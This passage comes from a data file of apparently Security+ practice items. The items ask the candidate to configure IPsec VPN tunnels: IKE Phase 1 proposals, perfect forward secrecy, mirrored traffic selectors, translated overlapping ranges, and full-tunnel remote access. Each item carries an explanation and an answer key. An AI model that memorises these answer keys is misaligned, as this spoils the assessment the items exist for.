        explanation: 'Their encryption line is still 3DES — the exact setting the audit raised — so applying this leaves a legacy proposal configured on one peer and the finding stands. Everything else in their proposal is a valid replacement: certificates address the exposed key, SHA-256 replaces SHA-1, and group 14 replaces group 2.',
        payload: { multi: false, lines: [
          { id: 'ln-auth', text: 'Authentication: Digital certificates' },
          { id: 'ln-enc', text: 'Phase 1 encryption: 3DES' },
          { id: 'ln-int', text: 'Phase 1 integrity: SHA-256' },
          { id: 'ln-dh', text: 'Key-agreement group: 14 (2048-bit MODP)' }
        ] },
        answer: { selected: ['ln-enc'] } }
    ]
  },

  {
    id: 'sp-vpn-04', cert: 'secplus', archetype: 'vpntunnel', objective: '1.4',
    topic: 'Cryptographic solutions', title: 'Choose crypto that survives a recorded session',
    estMinutes: 5, policyFloor: ['pfs','aes192-min'],
    scenario: 'Your threat model for the research-network tunnel assumes a well-resourced observer is recording the ciphertext today and hoping to recover a gateway private key years from now. That assumption drives the build: a future key compromise must not decrypt traffic captured today. The research-data classification additionally sets the floor at AES-192 minimum, Phase 1 integrity SHA-256 or better, and a 2048-bit-equivalent key-agreement group or better, and only the two named lab subnets enter the tunnel. Both sites are yours; both hold certificates, and a 32-character random pre-shared key is also provisioned in the two configs. Configure the crypto on both ends.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Cambridge lab', type: 'network', subnet: '10.40.0.0/16', note: 'GW-CAM · 203.0.113.60' },
      { id: 'siteB', label: 'Edinburgh lab', type: 'network', subnet: '10.45.0.0/16', note: 'GW-EDI · 198.51.100.90' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on both gateways to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. Note what authentication does NOT decide here. Whether the peers prove identity with a certificate or a pre-shared key, the session key still comes from the Diffie-Hellman exchange — so neither choice is what protects a past capture, and rejecting PSK on forward-secrecy grounds would be the actual error. What the DH exchange gives you is that each side derives the shared secret from a private exponent that never leaves the gateway and is discarded when the SA expires; the public values do cross the wire, and that is fine.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-CAM · Cambridge' }, { id: 'B', label: 'GW-EDI · Edinburgh' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key' }, { id: 'cert', text: 'Digital certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key' }, { id: 'cert', text: 'Digital certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['psk','cert'], 'a-enc': ['aes192','aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['psk','cert'], 'b-enc': ['aes192','aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Configure Phase 2 so the data SAs keep forward secrecy too.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. This is the step that answers the threat model. Phase 1 forward secrecy protects the IKE SA only; disable PFS and every child SA is rekeyed from that same Phase 1 material, so one compromise unwinds the lot. Be honest about the limit: PFS defends against later KEY theft, not against the mathematics being broken — a future quantum capability would attack the recorded DH exchange itself, and neither group 14 nor 19 survives that. On the selectors: a 0.0.0.0/0 pair would mirror and negotiate, and is still wrong — it pulls all site traffic into the tunnel rather than the research link you scoped.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-CAM · Cambridge' }, { id: 'B', label: 'GW-EDI · Edinburgh' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'cam', text: '10.40.0.0/16 · Cambridge lab' }, { id: 'edi', text: '10.45.0.0/16 · Edinburgh lab' }, { id: 'any', text: '0.0.0.0/0 · any' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'cam', text: '10.40.0.0/16 · Cambridge lab' }, { id: 'edi', text: '10.45.0.0/16 · Edinburgh lab' }, { id: 'any', text: '0.0.0.0/0 · any' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'cam', text: '10.40.0.0/16 · Cambridge lab' }, { id: 'edi', text: '10.45.0.0/16 · Edinburgh lab' }, { id: 'any', text: '0.0.0.0/0 · any' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'cam', text: '10.40.0.0/16 · Cambridge lab' }, { id: 'edi', text: '10.45.0.0/16 · Edinburgh lab' }, { id: 'any', text: '0.0.0.0/0 · any' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['cam'], 'a-remote': ['edi'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espaes192','espgcm'], 'b-local': ['edi'], 'b-remote': ['cam'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espaes192','espgcm'] } } }
    ]
  },

  {
    id: 'sp-vpn-05', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Both sites numbered 10.10.0.0/16 — tunnel the acquisition anyway',
    estMinutes: 6, policyFloor: ['no-psk','pfs','aes256-min'],
    scenario: 'The company you acquired numbered its head office 10.10.0.0/16 — the same range as yours. Re-addressing either site would take months you do not have, so each side is presented to the other under a translated range: your HQ appears to them as 10.98.0.0/16, and their site appears to you as 10.99.0.0/16. Each gateway translates back to real addresses on arrival, and the crypto selectors are written against the TRANSLATED ranges on both ends. Security standard for this link, and it is not negotiable: certificate authentication only (no pre-shared keys), Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent key-agreement group or better, and perfect forward secrecy on every child-SA rekey. Encryption is AES-256 minimum. Configure both gateways.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'HQ as seen by the peer', type: 'network', subnet: '10.98.0.0/16', note: 'GW-HQ · real range 10.10.0.0/16' },
      { id: 'siteB', label: 'Acquired site as seen by you', type: 'network', subnet: '10.99.0.0/16', note: 'GW-ACQ · real range 10.10.0.0/16' },
      { id: 'siteC', label: 'Conflicting real range', type: 'network', subnet: '10.10.0.0/16', note: 'in use at BOTH sites — never a selector' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on both gateways to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. Note that the address translation here is INTERNAL to the two sites — it rewrites the protected ranges so they stop colliding. It is not NAT traversal, which is a separate problem about surviving a NAT device in the path between the gateways, and nothing in this build depends on it.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-HQ · your network' }, { id: 'B', label: 'GW-ACQ · acquired' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key' }, { id: 'cert', text: 'Digital certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key' }, { id: 'cert', text: 'Digital certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert'], 'a-enc': ['aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert'], 'b-enc': ['aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Set the Phase 2 selectors using the translated ranges on BOTH ends.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. The overlap is resolved by never letting the duplicated range appear in a selector at all. Translating only one side does not work: the acquired gateway would then hold 10.10.0.0/16 as its remote, which is its OWN directly-connected LAN, so it routes that traffic locally and never puts it in the tunnel. Both sides must be presented under a non-conflicting range, and the mirror then holds on the translated addresses — which is the entire trick. On the transform, only AES-256-GCM clears the AES-256 floor; every CBC option here sits below it.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-HQ · your network' }, { id: 'B', label: 'GW-ACQ · acquired' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local selector — this end AS PRESENTED to the peer', options: [ { id: 'hqx', text: '10.98.0.0/16 · HQ, translated' }, { id: 'acqx', text: '10.99.0.0/16 · acquired site, translated' }, { id: 'real', text: '10.10.0.0/16 · real range, in use at BOTH sites' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote selector — the peer AS PRESENTED to you', options: [ { id: 'hqx', text: '10.98.0.0/16 · HQ, translated' }, { id: 'acqx', text: '10.99.0.0/16 · acquired site, translated' }, { id: 'real', text: '10.10.0.0/16 · real range, in use at BOTH sites' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local selector — this end AS PRESENTED to the peer', options: [ { id: 'hqx', text: '10.98.0.0/16 · HQ, translated' }, { id: 'acqx', text: '10.99.0.0/16 · acquired site, translated' }, { id: 'real', text: '10.10.0.0/16 · real range, in use at BOTH sites' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote selector — the peer AS PRESENTED to you', options: [ { id: 'hqx', text: '10.98.0.0/16 · HQ, translated' }, { id: 'acqx', text: '10.99.0.0/16 · acquired site, translated' }, { id: 'real', text: '10.10.0.0/16 · real range, in use at BOTH sites' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['hqx'], 'a-remote': ['acqx'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espgcm'], 'b-local': ['acqx'], 'b-remote': ['hqx'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espgcm'] } } }
    ]
  },

  {
    id: 'sp-vpn-06', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Full-tunnel remote access for the support desk',
    estMinutes: 5, policyFloor: ['no-psk','pfs','aes192-min'],
    scenario: 'The support desk went permanently remote and handles customer records from home broadband. Legal’s position is that every packet those laptops send must traverse the corporate egress so it is filtered and logged — no exceptions, including general web browsing. You are configuring the concentrator and the client profile pushed to the laptops. Security standard for this link, and it is not negotiable: certificate authentication only (no pre-shared keys), Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent key-agreement group or better, and perfect forward secrecy on every child-SA rekey. Encryption is AES-192 minimum, and shared secrets are not acceptable on user devices.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Corporate network', type: 'network', subnet: '10.50.0.0/16', note: 'concentrator · 203.0.113.100' },
      { id: 'siteB', label: 'Client address pool', type: 'network', subnet: '10.51.0.0/24', note: 'assigned to connected laptops' },
      { id: 'siteC', label: 'All destinations', type: 'network', subnet: '0.0.0.0/0', note: 'full-tunnel egress via corporate' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on the concentrator and in the pushed client profile, to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. A remote-access profile is still an IKE negotiation, so a mismatch fails exactly as it would between two site gateways: the client reports no acceptable proposal and never receives an address. A group pre-shared key is one secret copied onto every laptop — it cannot tell you WHICH device connected, and one lost laptop means rotating it everywhere. Machine certificates are per-device and individually revocable.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Machine certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Machine certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert'], 'a-enc': ['aes192','aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert'], 'b-enc': ['aes192','aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Set the Phase 2 selectors so ALL client traffic rides the tunnel.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. Full tunnel means the client sends 0.0.0.0/0 into the tunnel — everything, including browsing with no business destination. The mirror still governs: the concentrator offers 0.0.0.0/0 as the network it protects and the client requests 0.0.0.0/0 as its remote, while the assigned pool address is the client-side selector at both ends. Offering only 10.50.0.0/16 would be a SPLIT tunnel, which is what legal ruled out. On the transform, AES-128-CBC and 3DES fall below the AES-192 floor, leaving AES-192-CBC with HMAC-SHA-256 or AES-256-GCM.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'corp', text: '10.50.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.51.0.0/24 · client pool' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'corp', text: '10.50.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.51.0.0/24 · client pool' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'corp', text: '10.50.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.51.0.0/24 · client pool' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'corp', text: '10.50.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.51.0.0/24 · client pool' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['all'], 'a-remote': ['pool'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espaes192','espgcm'], 'b-local': ['pool'], 'b-remote': ['all'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espaes192','espgcm'] } } }
    ]
  },

  {
    id: 'sp-vpn-07', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Full-tunnel access for the clinical records team',
    estMinutes: 6, policyFloor: ['no-psk','pfs','aes256-min'],
    scenario: 'Clinical coders working from home reach a records system whose data classification mandates AES-256 end to end. Everything those laptops send goes through the corporate egress. Security standard for this link, and it is not negotiable: certificate authentication only (no pre-shared keys), Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent key-agreement group or better, and perfect forward secrecy on every child-SA rekey. Device certificates are mandated and group secrets are not permitted. A contractor has proposed a client profile for the rollout and you must sign it off before it is pushed to 300 devices.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Records network', type: 'network', subnet: '10.60.0.0/16', note: 'concentrator · 203.0.113.140' },
      { id: 'siteB', label: 'Client address pool', type: 'network', subnet: '10.61.0.0/24', note: 'assigned to coder laptops' },
      { id: 'siteC', label: 'All destinations', type: 'network', subnet: '0.0.0.0/0', note: 'full-tunnel egress' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on the concentrator and in the pushed client profile, to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. When a classification names an algorithm the encryption slot stops being a set — only AES-256 is compliant, and both the concentrator and the pushed profile must carry it. Authentication keeps a genuine set: a machine certificate alone satisfies the mandate, and the same certificate with user MFA layered on exceeds it. MFA alone would not — the certificate is what authenticates the device to IKE.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Machine certificates' }, { id: 'certmfa', text: 'Machine certificate + user MFA' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
